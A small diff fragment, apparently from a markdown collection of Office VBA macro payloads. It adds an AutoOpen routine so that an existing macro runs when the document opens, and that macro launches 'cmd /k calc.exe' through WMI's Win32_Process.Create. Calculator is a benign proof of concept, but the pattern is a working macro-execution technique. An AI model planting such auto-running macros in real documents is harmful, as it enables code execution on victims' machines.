@@ -9,6 +9,10 @@ Sub MyMacro()
     Arg = "cmd /k calc.exe"
     GetObject("winmgmts:").Get("Win32_Process").Create Arg, Null, Null, pid
 End Sub
+
+Sub AutoOpen()
+    Mymacro
+End Sub
 ```
 
 ```vba
